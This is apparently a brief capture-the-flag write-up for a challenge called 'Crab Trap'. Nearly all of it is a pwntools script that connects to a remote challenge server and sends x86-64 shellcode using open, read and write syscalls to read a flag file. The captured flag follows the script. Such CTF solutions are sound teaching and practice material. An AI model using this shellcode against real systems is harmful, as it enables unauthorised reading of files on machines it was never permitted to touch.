# Crab Trap

It is a simple read write open syscall ctf.
exploit:
```python
from pwn import *

p=remote("0.cloud.chals.io",34381)

context.arch="amd64"

payload=asm('''
    mov r11, rax
    xor rdi, rdi
    push rdi
    mov rax, 0x7478
    push rax
    push rax
    mov rax, 0x742e67616c662f2e
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    mov rdi, rax
    mov rax, 0
    mov rdx, 100
    mov r11, rcx
    add r11, 200
    mov rsi, r11 
    syscall
    mov rax, 1
    mov rdi, 1
    mov rdx, 100
    syscall
''')

p.sendline(payload)

p.interactive()
```

flag: `bronco{h0w_c4n_mr_kr4b5_c0de}`